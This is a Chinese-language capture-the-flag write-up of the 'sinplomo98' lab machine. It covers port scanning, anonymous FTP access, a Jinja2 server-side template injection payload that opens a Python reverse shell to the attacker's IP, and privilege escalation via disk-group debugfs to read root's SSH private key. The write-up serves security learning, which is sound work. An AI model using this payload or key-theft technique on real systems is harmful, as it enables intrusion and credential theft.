# thl_sinplomo98笔记

**靶机**：https://thehackerslabs.com/sinplomo98/
**难度**：高级（AVANZADO）
**攻击ip**:192.168.205.141
**靶机ip**:192.168.205.157

# 1.端口扫描

首先使用`nmap`扫描目标机器的开放端口：

```
nmap 192.168.205.157
```

![image](https://github.com/user-attachments/assets/35d20d5f-2eb5-461b-a2aa-e2ff6bcdff3f)

通过扫描，发现目标机器上开放了多个端口，其中21端口（FTP服务）和5000端口（Web服务）我比较感兴趣。
先看21 ftp服务

# 2. FTP服务探测

```
ftp 192.168.205.157

#使用匿名登录
anonymous 
anonymous

ls
mget supermegaultraimportantebro.txt
cat supermegaultraimportantebro.txt
```

![image](https://github.com/user-attachments/assets/0a02e140-b0df-406b-bd17-2251aa43f2ea)
呵！就不[狗头]

# 3. Web服务探测

接下来，访问目标的80端口，进行模糊测试，但未能发现什么有用的信息。继续探测5000端口，发现是Web服务。

看看源代码有没有提示

![image](https://github.com/user-attachments/assets/ff805305-85d4-4c31-8d64-2dc135498bc4)

根据页面的提示，加上路径测试。

![image](https://github.com/user-attachments/assets/fb34ab9b-90d7-4373-beb6-04948a83a1f0)

# 4.SSTI利用

经测试，确认该Web服务存在Server-Side Template Injection（SSTI）漏洞
[https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md)
尝试执行基本的模板语法：

```
{{8*8}}
```

通过以下payload执行远程命令：

```
{% for x in [].__class__.__base__.__subclasses__() %}
    {% if x.__init__ is defined and x.__init__.__globals__ is defined and 'exec' in x.__init__.__globals__['__builtins__']['exec'].__name__ %}
        {{ x.__init__.__globals__['__builtins__']['exec']('import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.205.141",8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")')}}
    {% endif %}
{% endfor %}

```

# 5. 权限提升

使用Linpeas脚本进行权限提升检查，发现目标系统属于disk组并存在SUID提取漏洞。

[https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe#disk-group](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe#disk-group)

```
#查看系统分区和文件系统信息
df -h
#使用debugfs查看文件
debugfs /dev/sda1
debugfs: cat /root/.ssh/id_rsa
```

通过拿到id_rsa文件后，使用John进行爆破，最终获取root权限。